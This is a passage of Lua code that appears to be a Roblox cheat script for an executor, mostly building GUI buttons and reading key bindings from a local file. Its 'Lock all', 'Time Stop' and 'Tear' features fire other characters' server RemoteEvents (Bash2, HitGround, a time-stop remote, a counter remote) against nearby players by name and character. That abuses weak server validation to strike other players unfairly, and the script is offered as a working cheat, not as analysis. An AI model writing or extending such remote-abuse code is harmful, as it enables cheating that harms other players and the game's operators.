	h.TextSize = 11
	h.TextColor3 = Color3.fromRGB(230, 230, 230)
	h.Parent = b
	end
	if h.Text ~= letter then
	h.Text = letter
	end
	h.Visible = pc and b.Visible == true
	end
	end
	if liNow then
	local rh = liNow:FindFirstChild("LiRHint")
	if rh and rh.Text ~= dr then
	rh.Text = dr
	end
	end
	end
	if aTrainModActive then
	local ax, ac, av, ar, af = extra:GetAttribute("BindAX") or "X", extra:GetAttribute("BindAC") or "C", extra:GetAttribute("BindAV") or "V", extra:GetAttribute("BindAR") or "R", extra:GetAttribute("BindAF") or "X"
	if tick() - (extra:GetAttribute("BindARead") or 0) > 1 then
	extra:SetAttribute("BindARead", tick())
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "A:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[1] then ax = vals[1] end
	if vals[2] then ac = vals[2] end
	if vals[3] then av = vals[3] end
	if vals[4] then ar = vals[4] end
	if vals[5] then af = vals[5] end
	end
	end
	end)
	extra:SetAttribute("BindAX", ax)
	extra:SetAttribute("BindAC", ac)
	extra:SetAttribute("BindAV", av)
	extra:SetAttribute("BindAR", ar)
	extra:SetAttribute("BindAF", af)
	end
	local finHint = FloatingGui:FindFirstChild("ATrainFinish")
	local aHints = {
	{FlashstrikeButton, ax},
	{MoAimButton, ac},
	{KickButton, av},
	{cancelButton, ar},
	{finHint, af}
	}
	for _, pair in ipairs(aHints) do
	local b, letter = pair[1], pair[2]
	if b then
	local h = b:FindFirstChild("PcHint")
	if not h then
	h = Instance.new("TextLabel")
	h.Name = "PcHint"
	h.Size = UDim2.new(1, 0, 0, 12)
	h.Position = UDim2.new(0, 0, 1, -6)
	h.BackgroundTransparency = 1
	h.Font = Enum.Font.GothamBold
	h.TextSize = 11
	h.TextColor3 = Color3.fromRGB(230, 230, 230)
	h.Parent = b
	end
	if h.Text ~= letter then
	h.Text = letter
	end
	h.Visible = pc and b.Visible == true
	end
	end
	end
	if KiraAimButton and KiraAimButton.Visible then
	local kv, kz, kx, kc = extra:GetAttribute("BindKV") or "V", extra:GetAttribute("BindKZ") or "Z", extra:GetAttribute("BindKX") or "X", extra:GetAttribute("BindKC") or "C"
	if tick() - (extra:GetAttribute("BindKRead") or 0) > 1 then
	extra:SetAttribute("BindKRead", tick())
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "K:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[1] then kv = vals[1] end
	if vals[2] then kz = vals[2] end
	if vals[3] then kx = vals[3] end
	if vals[4] then kc = vals[4] end
	end
	end
	end)
	extra:SetAttribute("BindKV", kv)
	extra:SetAttribute("BindKZ", kz)
	extra:SetAttribute("BindKX", kx)
	extra:SetAttribute("BindKC", kc)
	end
	local hintV = KiraAimButton:FindFirstChild("PcHint")
	if hintV and hintV.Text ~= kv then
	hintV.Text = kv
	end
	local arrowBtn = KiraAimButton:FindFirstChild("KiraArrow")
	local hintC = arrowBtn and arrowBtn:FindFirstChild("PcHint")
	if hintC and hintC.Text ~= kc then
	hintC.Text = kc
	end
	local instaBtn = KiraAimButton:FindFirstChild("KiraInsta", true)
	local hintZ = instaBtn and instaBtn:FindFirstChild("PcHint")
	if hintZ and hintZ.Text ~= kz then
	hintZ.Text = kz
	end
	local delayBtn = KiraAimButton:FindFirstChild("KiraDelay", true)
	local hintX = delayBtn and delayBtn:FindFirstChild("PcHint")
	if hintX and hintX.Text ~= kx then
	hintX.Text = kx
	end
	end
	if extra:GetAttribute("Hooked") ~= true then
	extra:SetAttribute("Hooked", true)
	-- 點一下執行一次：Fire Pibby Counter（手機/PC 相同）
	extra.MouseButton1Click:Connect(function()
	if moveUnlocked then return end
	if extra:GetAttribute("Busy") == true then return end
	extra:SetAttribute("Busy", true)
	local remote = nil
	local charsFolder = ReplicatedStorage:FindFirstChild("Characters")
	if charsFolder then
	for _, folder in ipairs(charsFolder:GetChildren()) do
	if folder.Name:lower():find("pibby") then
	local remotesFolder = folder:FindFirstChild("Remotes")
	if remotesFolder then
	for _, r in ipairs(remotesFolder:GetChildren()) do
	if r:IsA("RemoteEvent") then
	local n = string.lower(r.Name)
	if n == "counter" or n:find("counter") then
	remote = r
	break
	end
	end
	end
	end
	end
	if remote then break end
	end
	end
	if not remote then
	extra.Text = "No Remote"
	extra.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
	task.delay(1.2, function()
	if extra then
	extra.Text = "Tear"
	extra.BackgroundColor3 = Color3.fromRGB(120, 30, 30)
	extra:SetAttribute("Busy", false)
	end
	end)
	return
	end
	pcall(function()
	remote:FireServer()
	end)
	extra.Text = "✓"
	extra.BackgroundColor3 = Color3.fromRGB(80, 40, 140)
	task.delay(0.6, function()
	if extra then
	extra.Text = "Tear"
	extra.BackgroundColor3 = Color3.fromRGB(120, 30, 30)
	extra:SetAttribute("Busy", false)
	end
	end)
	end)
	end
	end
	task.wait(0.2)
	end
	end)
	end
	do
	local leftBtn = Instance.new("TextButton")
	leftBtn.Size = UDim2.new(0.5, -8, 0, 24)
	leftBtn.Position = UDim2.new(0, 5, 0, 244)
	leftBtn.BackgroundColor3 = Color3.fromRGB(74, 107, 130)
	leftBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	leftBtn.Font = Enum.Font.GothamBold
	leftBtn.TextSize = 10
	leftBtn.Text = "Lock all"
	leftBtn.TextScaled = true
	leftBtn.Parent = Page2Scroll
	local leftCorner = Instance.new("UICorner")
	leftCorner.CornerRadius = UDim.new(0, 4)
	leftCorner.Parent = leftBtn
	local lockOn = false
	leftBtn.MouseButton1Click:Connect(function()
	if lockOn then
	lockOn = false
	leftBtn.Text = "Lock all"
	leftBtn.BackgroundColor3 = Color3.fromRGB(74, 107, 130)
	return
	end
	lockOn = true
	leftBtn.Text = "Lock ON"
	leftBtn.BackgroundColor3 = Color3.fromRGB(110, 150, 180)
	task.spawn(function()
	while lockOn do
	local remote = ReplicatedStorage.Characters.DarthVader.Remotes.Bash2
	local me = LocalPlayer.Character
	local hrp = me and me:FindFirstChild("HumanoidRootPart")
	local list = {}
	if hrp then
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer then
	local c = plr.Character
	local r = c and c:FindFirstChild("HumanoidRootPart")
	local hum = c and c:FindFirstChildOfClass("Humanoid")
	if r and hum and hum.Health > 0 then
	table.insert(list, {
	p = plr,
	d = (r.Position - hrp.Position).Magnitude
	})
	end
	end
	end
	end
	table.sort(list, function(x, y)
	return x.d < y.d
	end)
	local n = #list
	if n > 14 then
	n = 14
	end
	if n < 1 then
	task.wait(0.05)
	else
	for i = 1, n do
	if not lockOn then
	break
	end
	local plr = list[i].p
	remote:FireServer(plr.DisplayName)
	remote:FireServer(plr.Name)
	remote:FireServer(plr.Character)
	task.wait(0.05)
	end
	end
	end
	end)
	end)
	local rightBtn = Instance.new("TextButton")
	rightBtn.Size = UDim2.new(0.5, -8, 0, 24)
	rightBtn.Position = UDim2.new(0.5, 2, 0, 244)
	rightBtn.BackgroundColor3 = Color3.fromRGB(74, 107, 130)
	rightBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	rightBtn.Font = Enum.Font.GothamBold
	rightBtn.TextSize = 10
	rightBtn.Text = "Tp all"
	rightBtn.TextScaled = true
	rightBtn.Parent = Page2Scroll
	local rightCorner = Instance.new("UICorner")
	rightCorner.CornerRadius = UDim.new(0, 4)
	rightCorner.Parent = rightBtn
	local tsToggle = Instance.new("TextButton")
	tsToggle.Name = "TimeStopToggle"
	tsToggle.Size = UDim2.new(1, -10, 0, 24)
	tsToggle.Position = UDim2.new(0, 5, 0, 272)
	tsToggle.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	tsToggle.TextColor3 = Color3.fromRGB(230, 230, 230)
	tsToggle.Font = Enum.Font.GothamBold
	tsToggle.TextSize = 10
	tsToggle.Text = "Time Stop"
	tsToggle.TextScaled = true
	tsToggle.Parent = Page2Scroll
	Instance.new("UICorner", tsToggle).CornerRadius = UDim.new(0, 4)
	tsToggle:SetAttribute("On", false)
	local tsKey = ""
	local tsKeyBox = Instance.new("TextBox")
	tsKeyBox.Name = "TimeStopKey"
	tsKeyBox.Size = UDim2.new(0, 28, 0, 24)
	tsKeyBox.Position = UDim2.new(1, -33, 0, 272)
	tsKeyBox.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
	tsKeyBox.TextColor3 = Color3.fromRGB(230, 230, 230)
	tsKeyBox.PlaceholderText = ""
	tsKeyBox.Text = ""
	tsKeyBox.Font = Enum.Font.GothamBold
	tsKeyBox.TextSize = 12
	tsKeyBox.ClearTextOnFocus = true
	tsKeyBox.Visible = LocalPlayer:GetAttribute("YYDSPC") == true
	tsKeyBox.Parent = Page2Scroll
	Instance.new("UICorner", tsKeyBox).CornerRadius = UDim.new(0, 4)
	if tsKeyBox.Visible then
	tsToggle.Size = UDim2.new(1, -42, 0, 24)
	end
	tsKeyBox:GetPropertyChangedSignal("Text"):Connect(function()
	local t = string.upper(tostring(tsKeyBox.Text or ""))
	t = string.gsub(t, "[^A-Z0-9]", "")
	t = string.sub(t, 1, 1)
	if tsKeyBox.Text ~= t then
	tsKeyBox.Text = t
	return
	end
	if t ~= "" then
	tsKey = t
	tsKeyBox:ReleaseFocus()
	end
	end)
	local tsBtn = Instance.new("TextButton")
	tsBtn.Name = "TimeStopBtn"
	tsBtn.Size = UDim2.new(0, 60, 0, 30)
	tsBtn.Position = DEFAULT_POSITIONS.Laser
	tsBtn.BackgroundColor3 = Color3.fromRGB(90, 40, 140)
	tsBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	tsBtn.Font = Enum.Font.GothamBold
	tsBtn.Text = "time stop"
	tsBtn.TextScaled = true
	tsBtn.TextWrapped = true
	tsBtn.Visible = false
	tsBtn.ZIndex = 20
	tsBtn.Parent = FloatingGui
	Instance.new("UICorner", tsBtn).CornerRadius = UDim.new(0, 8)
	local tsMarks = Instance.new("Folder")
	tsMarks.Name = "YYDSTimeStopMarks"
	tsMarks.Parent = workspace
	local tsCd = false
	local tsArmed = false
	local tsCircle = Instance.new("Model")
	tsCircle.Name = "YYDSTimeStopCircle"
	tsCircle.Parent = workspace
	local tsFloor = Instance.new("Part")
	tsFloor.Shape = Enum.PartType.Cylinder
	tsFloor.Anchored = true
	tsFloor.CanCollide = false
	tsFloor.CanQuery = false
	tsFloor.CanTouch = false
	tsFloor.CastShadow = false
	tsFloor.Material = Enum.Material.SmoothPlastic
	tsFloor.Color = Color3.fromRGB(200, 40, 40)
	tsFloor.Transparency = 1
	tsFloor.Parent = tsCircle
	local tsRims = {}
	for i = 1, 24 do
	local rim = Instance.new("Part")
	rim.Anchored = true
	rim.CanCollide = false
	rim.CanQuery = false
	rim.CanTouch = false
	rim.CastShadow = false
	rim.Material = Enum.Material.SmoothPlastic
	rim.Color = Color3.fromRGB(220, 50, 50)
	rim.Transparency = 1
	rim.Parent = tsCircle
	tsRims[i] = rim
	end
	local function tsSetCircle(on)
	tsFloor.Transparency = on and 0.78 or 1
	for i = 1, 24 do
	tsRims[i].Transparency = on and 0.35 or 1
	end
	end
	RunService.Heartbeat:Connect(function()
	if not tsArmed then return end
	local ch = LocalPlayer.Character
	local root = ch and ch:FindFirstChild("HumanoidRootPart")
	if not root then return end
	local hum = ch:FindFirstChildOfClass("Humanoid")
	local hip = hum and (hum.HipHeight + 0.15) or 3
	local pos = Vector3.new(root.Position.X, root.Position.Y - hip, root.Position.Z)
	local rad = 25
	tsFloor.Size = Vector3.new(0.12, rad * 2, rad * 2)
	tsFloor.CFrame = CFrame.new(pos) * CFrame.Angles(0, 0, math.rad(90))
	local seg = (2 * math.pi * rad) / 24 * 1.08
	for i = 1, 24 do
	local a = (i / 24) * math.pi * 2
	local p2 = pos + Vector3.new(math.cos(a) * rad, 0.22, math.sin(a) * rad)
	tsRims[i].Size = Vector3.new(0.18, 0.44, seg)
	tsRims[i].CFrame = CFrame.lookAt(p2, p2 + Vector3.new(-math.sin(a), 0, math.cos(a)))
	end
	end)
	local function tsPlace()
	if tsToggle:GetAttribute("On") ~= true then
	tsBtn.Visible = false
	return
	end
	local pc = LocalPlayer:GetAttribute("YYDSPC") == true
	local fg = FloatingGui
	local gun = fg:FindFirstChild("DeadpoolSkill")
	local li = fg:FindFirstChild("LifeInsure")
	local neck = fg:FindFirstChild("NeckSnap")
	local stalk = fg:FindFirstChild("Stalk")
	local wolf = li and li:GetAttribute("IsWolverine") == true and li.Visible
	local dead = gun and gun.Visible and not wolf
	local myersOn = (not homelanderModActive) and (not aTrainModActive) and (not kiraAim) and ((neck and neck.Visible) or (stalk and stalk.Visible))
	if pc then
	if dead then
	tsBtn.Size = UDim2.new(0, 44, 0, 44)
	tsBtn.Position = UDim2.new(0.5, -36, 1, -96)
	tsBtn.Visible = true
	return
	end
	if kiraAim then
	tsBtn.Size = UDim2.new(0, 44, 0, 44)
	tsBtn.Position = UDim2.new(0.5, -88, 1, -96)
	tsBtn.Visible = true
	return
	end
	local right = -192
	local names = {"LaserButton", "Flashstrike", "Kick", "Upthrow", "Ramkill", "HomeExtra", "ATrainFinish", "KiraAimButton", "DeadpoolSkill", "NeckSnap", "Stalk", "TerrorBlade", "MyersStab", "MMLifeInsure", "Pounce"}
	for _, nm in ipairs(names) do
	local b = fg:FindFirstChild(nm)
	if not b and nm == "LaserButton" then b = LaserButton end
	if not b and nm == "Flashstrike" then b = FlashstrikeButton end
	if not b and nm == "Kick" then b = KickButton end
	if not b and nm == "Upthrow" then b = UpthrowButton end
	if not b and nm == "Ramkill" then b = MoAimButton end
	if b and b.Visible and b.Position.Y.Offset <= -80 then
	local x = b.Position.X.Offset
	if x > right then right = x end
	end
	end
	local hasRow = false
	for _, nm in ipairs(names) do
	local b = fg:FindFirstChild(nm)
	if not b and nm == "LaserButton" then b = LaserButton end
	if not b and nm == "Flashstrike" then b = FlashstrikeButton end
	if not b and nm == "Kick" then b = KickButton end
	if not b and nm == "Upthrow" then b = UpthrowButton end
	if not b and nm == "Ramkill" then b = MoAimButton end
	if b and b.Visible and b.Position.Y.Offset <= -80 then
	hasRow = true
	break
	end
	end
	tsBtn.Size = UDim2.new(0, 44, 0, 44)
	if hasRow then
	tsBtn.Position = UDim2.new(0.5, right + 52, 1, -96)
	else
	tsBtn.Position = UDim2.new(0.5, -192, 1, -96)
	end
	elseif homelanderModActive then
	tsBtn.Size = UDim2.new(0, 60, 0, 30)
	tsBtn.Position = UDim2.new(1, -310, 0.5, -176)
	elseif aTrainModActive then
	tsBtn.Size = UDim2.new(0, 60, 0, 30)
	tsBtn.Position = UDim2.new(1, -310, 0.5, -138)
	elseif kiraAim then
	tsBtn.Size = UDim2.new(0, 60, 0, 30)
	tsBtn.Position = DEFAULT_POSITIONS.Laser
	elseif dead or wolf then
	tsBtn.Size = UDim2.new(0, 60, 0, 60)
	tsBtn.Position = UDim2.new(1, -310, 0.5, -100)
	elseif myersOn then
	tsBtn.Size = UDim2.new(0, 60, 0, 30)
	tsBtn.Position = UDim2.new(1, -310, 0.5, -138)
	else
	tsBtn.Size = UDim2.new(0, 60, 0, 30)
	tsBtn.Position = DEFAULT_POSITIONS.Laser
	end
	tsBtn.Visible = true
	end
	task.spawn(function()
	while tsBtn.Parent do
	tsPlace()
	task.wait(0.2)
	end
	end)
	tsToggle.MouseButton1Click:Connect(function()
	local on = tsToggle:GetAttribute("On") ~= true
	tsToggle:SetAttribute("On", on)
	if on then
	tsToggle.BackgroundColor3 = Color3.fromRGB(90, 40, 140)
	tsToggle.Text = "Time Stop ON"
	else
	tsToggle.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
	tsToggle.Text = "Time Stop"
	tsBtn.Visible = false
	tsArmed = false
	tsSetCircle(false)
	end
	tsPlace()
	end)
	local function tsRun()
	if tsCd then return end
	if tsToggle:GetAttribute("On") ~= true then return end
	if not tsArmed then
	tsArmed = true
	tsSetCircle(true)
	tsBtn.Text = "ready"
	tsBtn.BackgroundColor3 = Color3.fromRGB(160, 50, 50)
	return
	end
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	local hitG, ts
	if chars then
	for _, f in ipairs(chars:GetChildren()) do
	local rem = f:FindFirstChild("Remotes")
	if rem then
	local fn = string.lower(f.Name)
	if fn == "homelander" then hitG = rem:FindFirstChild("HitGround") end
	if string.find(fn, "thanos", 1, true) then
	for _, r in ipairs(rem:GetChildren()) do
	if r:IsA("RemoteEvent") then
	local n = string.lower(r.Name)
	if n:find("timestop") or n:find("time_stop") or n:find("stop time") or n:find("time") or n:find("stop") then
	ts = r
	break
	end
	end
	end
	end
	end
	end
	end
	if not hitG then
	tsBtn.Text = "No Hit"
	task.delay(0.6, function()
	if not tsCd then tsBtn.Text = "time stop" end
	end)
	return
	end
	local ch = LocalPlayer.Character
	local myRoot = ch and ch:FindFirstChild("HumanoidRootPart")
	if not myRoot then return end
	local list = {}
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and plr.Character then
	local r = plr.Character:FindFirstChild("HumanoidRootPart")
	local h = plr.Character:FindFirstChildOfClass("Humanoid")
	if r and h and h.Health > 0 and (r.Position - myRoot.Position).Magnitude <= 25 then
	table.insert(list, plr)
	end
	end
	end
	if #list == 0 then
	tsBtn.Text = "No one"
	task.delay(0.6, function()
	if tsArmed and not tsCd then tsBtn.Text = "ready" end
	end)
	return
	end
	tsArmed = false
	tsSetCircle(false)
	if ts then pcall(function() ts:FireServer() end) end
	for _, chd in ipairs(tsMarks:GetChildren()) do chd:Destroy() end
	for _, plr in ipairs(list) do
	pcall(function()
	hitG:FireServer(plr.DisplayName)
	hitG:FireServer(plr.Name)
	hitG:FireServer(plr.Character)
	end)
	local head = plr.Character and (plr.Character:FindFirstChild("Head") or plr.Character:FindFirstChild("HumanoidRootPart"))
	if head then
	local box = Instance.new("Part")
	box.Size = Vector3.new(1.4, 1.4, 0.12)
	box.Anchored = true
	box.CanCollide = false
	box.CanQuery = false
	box.CanTouch = false
	box.CastShadow = false
	box.Material = Enum.Material.SmoothPlastic
	box.Color = Color3.fromRGB(28, 28, 32)
	box.Transparency = 0.1
	box.Parent = tsMarks
	local sg = Instance.new("SurfaceGui")
	sg.Face = Enum.NormalId.Front
	sg.SizingMode = Enum.SurfaceGuiSizingMode.PixelsPerStud
	sg.PixelsPerStud = 60
	sg.LightInfluence = 0
	sg.Parent = box
	local num = Instance.new("TextLabel")
	num.Size = UDim2.new(1, 0, 1, 0)
	num.BackgroundTransparency = 1
	num.Font = Enum.Font.GothamBold
	num.TextScaled = true
	num.TextColor3 = Color3.fromRGB(255, 255, 255)
	num.Text = "4"
	num.Parent = sg
	local conn
	conn = RunService.RenderStepped:Connect(function()
	local chNow = plr.Character
	local hNow = chNow and (chNow:FindFirstChild("Head") or chNow:FindFirstChild("HumanoidRootPart"))
	if not hNow or not box.Parent then
	if conn then conn:Disconnect() end
	if box then box:Destroy() end
	return
	end
	local cam = workspace.CurrentCamera
	local pos = hNow.Position + Vector3.new(0, 3.1, 0)
	if cam then
	box.CFrame = CFrame.lookAt(pos, cam.CFrame.Position)
	else
	box.Position = pos
	end
	end)
	task.spawn(function()
	for i = 4, 1, -1 do
	if not box.Parent then break end
	num.Text = tostring(i)
	task.wait(1)
	end
	if conn then conn:Disconnect() end
	if box then box:Destroy() end
	end)
	end
	end
	tsCd = true
	tsBtn.BackgroundColor3 = Color3.fromRGB(60, 30, 90)
	task.spawn(function()
	for i = 5, 1, -1 do
	if tsToggle:GetAttribute("On") ~= true then break end
	tsBtn.Text = tostring(i)
	task.wait(1)
	end
	tsCd = false
	tsBtn.Text = "time stop"
	tsBtn.BackgroundColor3 = Color3.fromRGB(90, 40, 140)
	end)
	end
	tsBtn.MouseButton1Click:Connect(tsRun)
	UIS.InputBegan:Connect(function(input, gp)
	if gp then return end
	if tsKey == "" then return end
	if tsToggle:GetAttribute("On") ~= true then return end
	if LocalPlayer:GetAttribute("YYDSPC") ~= true then return end
	if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
	if tsKeyBox:IsFocused() then return end
	if string.upper(input.KeyCode.Name) == tsKey then
	tsRun()
	end
	end)
	task.spawn(function()
	local pounce = Instance.new("TextButton")
	pounce.Name = "Pounce"
	pounce.Size = UDim2.new(0, 60, 0, 60)
	pounce.Position = UDim2.new(1, -310, 0.5, -100)
	pounce.BackgroundColor3 = Color3.fromRGB(90, 40, 90)
	pounce.TextColor3 = Color3.fromRGB(255, 255, 255)
	pounce.Font = Enum.Font.GothamBold
	pounce.Text = "Pounce"
	pounce.TextScaled = true
	pounce.TextWrapped = true
	pounce.Visible = false
	pounce.ZIndex = 20
	pounce.Parent = FloatingGui
	Instance.new("UICorner", pounce).CornerRadius = UDim.new(0, 8)
	local ph = Instance.new("TextLabel")
	ph.Name = "PcHint"
	ph.Size = UDim2.new(1, 0, 0, 12)
	ph.Position = UDim2.new(0, 0, 1, -6)
	ph.BackgroundTransparency = 1
	ph.Font = Enum.Font.GothamBold
	ph.TextSize = 11
	ph.TextColor3 = Color3.fromRGB(230, 230, 230)
	ph.Text = "C"
	ph.Visible = false
	ph.Parent = pounce
	local RANGE_HALF = 30
	local RANGE_R = 30
	local RANGE_IN = 3
	local CD = 14
	local busy = false
	local armed = false
	local cdEnd = 0
	local pKey = "C"
	local POUNCE_ANIM = "131883485601839"
	local animSeen = false
	RunService.Heartbeat:Connect(function()
	local liOn = FloatingGui:FindFirstChild("LifeInsure")
	if not (liOn and liOn.Visible and liOn:GetAttribute("IsWolverine") == true) then
	animSeen = false
	return
	end
	local ch = LocalPlayer.Character
	local hum = ch and ch:FindFirstChildOfClass("Humanoid")
	local an = hum and (hum:FindFirstChildOfClass("Animator") or hum)
	local playing = false
	if an then
	for _, tr in ipairs(an:GetPlayingAnimationTracks()) do
	local id = tr.Animation and tr.Animation.AnimationId or ""
	if string.find(id, POUNCE_ANIM, 1, true) then
	playing = true
	break
	end
	end
	end
	if playing and not animSeen then
	animSeen = true
	if tick() >= cdEnd then
	cdEnd = tick() + CD
	end
	armed = false
	fan.Parent = nil
	claw.Parent = nil
	elseif not playing then
	animSeen = false
	end
	end)
	local function readKey()
	local k = "C"
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "W:([A-Z0-9,]+)")
	if body then
	local vals = {}
	local n = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	n = n + 1
	vals[n] = tok
	end
	if vals[3] then k = vals[3] end
	end
	end
	end)
	pKey = k
	ph.Text = k
	end
	readKey()
	local fan = Instance.new("Model")
	fan.Name = "YYDSPounceFan"
	local outer, inner, sideL, sideR = {}, {}, {}, {}
	local function mk(list, n, col)
	for i = 1, n do
	local part = Instance.new("Part")
	part.Anchored = true
	part.CanCollide = false
	part.CanQuery = false
	part.CanTouch = false
	part.CastShadow = false
	part.Material = Enum.Material.SmoothPlastic
	part.Color = col
	part.Transparency = 0.35
	part.Parent = fan
	list[i] = part
	end
	end
	mk(outer, 20, Color3.fromRGB(220, 50, 50))
	mk(inner, 6, Color3.fromRGB(255, 120, 120))
	mk(sideL, 3, Color3.fromRGB(200, 40, 40))
	mk(sideR, 3, Color3.fromRGB(200, 40, 40))
	local function findRem(charPart, name)
	local chars = ReplicatedStorage:FindFirstChild("Characters")
	if not chars then return nil end
	for _, f in ipairs(chars:GetChildren()) do
	if string.lower(f.Name):find(charPart) then
	local rem = f:FindFirstChild("Remotes")
	if rem then return rem:FindFirstChild(name) end
	end
	end
	return nil
	end
	local claw = Instance.new("Model")
	claw.Name = "YYDSPounceClaw"
	local clawParts = {}
	for i = 1, 3 do
	local s = Instance.new("Part")
	s.Size = Vector3.new(0.12, 1.15, 0.08)
	s.Anchored = true
	s.CanCollide = false
	s.CanQuery = false
	s.CanTouch = false
	s.CastShadow = false
	s.Material = Enum.Material.SmoothPlastic
	s.Color = Color3.fromRGB(210, 40, 40)
	s.Transparency = 0.05
	s.Parent = claw
	clawParts[i] = s
	end
	local clawTarget = nil
	local function nearestFan()
	local ch = LocalPlayer.Character
	local root = ch and ch:FindFirstChild("HumanoidRootPart")
	if not root then return nil end
	local fwd = root.CFrame.LookVector
	local flat = Vector3.new(fwd.X, 0, fwd.Z)
	if flat.Magnitude < 0.01 then return nil end
	flat = flat.Unit
	local cosL = math.cos(math.rad(RANGE_HALF))
	local best, bestD = nil, math.huge
	for _, plr in ipairs(Players:GetPlayers()) do
	if plr ~= LocalPlayer and plr.Character then
	local r = plr.Character:FindFirstChild("HumanoidRootPart")
	local h = plr.Character:FindFirstChildOfClass("Humanoid")
	if r and h and h.Health > 0 then
	local diff = r.Position - root.Position
	local fl = Vector3.new(diff.X, 0, diff.Z)
	local d = fl.Magnitude
	if d >= RANGE_IN and d <= RANGE_R then
	if flat:Dot(fl.Unit) >= cosL and d < bestD then
	best, bestD = plr, d
	end
	end
	end
	end
	end
	return best
	end
	local function wolfOn()
	local li = FloatingGui:FindFirstChild("LifeInsure")
	return li and li.Visible and li:GetAttribute("IsWolverine") == true
	end
	local function placeFan()
	local ch = LocalPlayer.Character
	local root = ch and ch:FindFirstChild("HumanoidRootPart")
	if not root then return false end
	local hum = ch:FindFirstChildOfClass("Humanoid")
	local hip = hum and (hum.HipHeight + 0.15) or 3
	local pos = Vector3.new(root.Position.X, root.Position.Y - hip, root.Position.Z)
	local fwd = root.CFrame.LookVector
	local flat = Vector3.new(fwd.X, 0, fwd.Z)
	if flat.Magnitude < 0.01 then return false end
	flat = flat.Unit
	local base = CFrame.lookAt(pos, pos + flat)
	local half = math.rad(RANGE_HALF)
	local total = half * 2
	local oLen = (2 * math.pi * RANGE_R * (total / (2 * math.pi))) / 20 * 1.12
	local iLen = (2 * math.pi * RANGE_IN * (total / (2 * math.pi))) / 6 * 1.15
	local sLen = (RANGE_R - RANGE_IN) / 3 * 1.12
	for i = 1, 20 do
	local a = -half + ((i - 0.5) / 20) * total
	local p2 = pos + base:VectorToWorldSpace(Vector3.new(math.sin(a) * RANGE_R, 0, -math.cos(a) * RANGE_R))
	local tan = base:VectorToWorldSpace(Vector3.new(math.cos(a), 0, math.sin(a)))
	if outer[i].Size ~= Vector3.new(0.18, 0.44, oLen) then
	outer[i].Size = Vector3.new(0.18, 0.44, oLen)
	end
	outer[i].CFrame = CFrame.lookAt(p2, p2 + tan)
	end
	for i = 1, 6 do
	local a = -half + ((i - 0.5) / 6) * total
	local p2 = pos + base:VectorToWorldSpace(Vector3.new(math.sin(a) * RANGE_IN, 0, -math.cos(a) * RANGE_IN))
	local tan = base:VectorToWorldSpace(Vector3.new(math.cos(a), 0, math.sin(a)))
	if inner[i].Size ~= Vector3.new(0.18, 0.44, iLen) then
	inner[i].Size = Vector3.new(0.18, 0.44, iLen)
	end
	inner[i].CFrame = CFrame.lookAt(p2, p2 + tan)
	end
	for i = 1, 3 do
	local t = (i - 0.5) / 3
	local r = RANGE_IN + t * (RANGE_R - RANGE_IN)
	local aL, aR = -half, half
	local pL = pos + base:VectorToWorldSpace(Vector3.new(math.sin(aL) * r, 0, -math.cos(aL) * r))
	local pR = pos + base:VectorToWorldSpace(Vector3.new(math.sin(aR) * r, 0, -math.cos(aR) * r))
	if sideL[i].Size ~= Vector3.new(0.18, 0.44, sLen) then
	sideL[i].Size = Vector3.new(0.18, 0.44, sLen)
	sideR[i].Size = Vector3.new(0.18, 0.44, sLen)
	end
	sideL[i].CFrame = CFrame.lookAt(pL, pL + base:VectorToWorldSpace(Vector3.new(math.sin(aL), 0, -math.cos(aL))))
	sideR[i].CFrame = CFrame.lookAt(pR, pR + base:VectorToWorldSpace(Vector3.new(math.sin(aR), 0, -math.cos(aR))))
	end
	return true
	end
	RunService.RenderStepped:Connect(function()
	if not armed then
	claw.Parent = nil
	return
	end
	if not fan.Parent then return end
	local mark = nearestFan()
	if not mark or not mark.Character then
	claw.Parent = nil
	else
	local head = mark.Character:FindFirstChild("Head") or mark.Character:FindFirstChild("HumanoidRootPart")
	if not head then
	claw.Parent = nil
	else
	claw.Parent = workspace
	local cam = workspace.CurrentCamera
	local base = head.Position + Vector3.new(0, 2.6, 0)
	local face = cam and CFrame.lookAt(base, cam.CFrame.Position) or CFrame.new(base)
	local offs = {-0.38, 0, 0.38}
	for i = 1, 3 do
	local tilt = CFrame.Angles(0, 0, math.rad(-28))
	clawParts[i].CFrame = face * CFrame.new(offs[i], 0, 0) * tilt
	end
	end
	end
	placeFan()
	end)
	task.spawn(function()
	while pounce.Parent do
	readKey()
	local on = wolfOn()
	if not on then
	pounce.Visible = false
	armed = false
	fan.Parent = nil
	else
	local pc = LocalPlayer:GetAttribute("YYDSPC") == true
	if pc then
	pounce.Size = UDim2.new(0, 44, 0, 44)
	pounce.Position = UDim2.new(0.5, -140, 1, -96)
	ph.Visible = true
	else
	pounce.Size = UDim2.new(0, 60, 0, 60)
	pounce.Position = UDim2.new(1, -310, 0.5, -100)
	ph.Visible = false
	end
	pounce.Visible = true
	if not busy then
	if armed then
	pounce.Text = "Confirm"
	pounce.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
	elseif tick() < cdEnd then
	pounce.Text = tostring(math.ceil(cdEnd - tick()))
	pounce.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
	else
	pounce.Text = "Pounce"
